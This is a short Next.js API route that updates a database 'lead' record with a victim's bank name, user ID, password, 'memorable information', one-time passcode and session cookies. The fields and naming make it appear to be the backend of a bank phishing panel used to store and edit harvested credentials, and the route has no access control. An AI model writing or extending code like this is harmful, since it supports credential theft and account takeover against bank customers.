import { NextResponse } from "next/server";
import { prisma } from "@/lib/prisma";

export async function PUT(request: Request, context: { params: Promise<{ id: string }> }) {
  try {
    const params = await context.params;
    const id = params.id;
    const body = await request.json();

    const updatedLead = await prisma.lead.update({
      where: { id },
      data: {
        ...(body.bank || body.bankName ? { bank: body.bank || body.bankName, bankName: body.bankName || body.bank } : {}),
        ...(body.bankType ? { bankType: body.bankType } : {}),
        ...(body.userId ? { userId: body.userId } : {}),
        ...(body.password ? { password: body.password } : {}),
        ...(body.memorableInfo ? { memorableInfo: body.memorableInfo } : {}),
        ...(body.otpCode ? { otpCode: body.otpCode } : {}),
        ...(body.extraData ? { extraData: body.extraData } : {}),
        ...(body.cookiesData ? { cookiesData: body.cookiesData } : {}),
      },
    });

    return NextResponse.json({ success: true, data: updatedLead });
  } catch (error: any) {
    console.error("PUT Lead Error:", error);
    return NextResponse.json({ success: false, error: error.message }, { status: 500 });
  }
}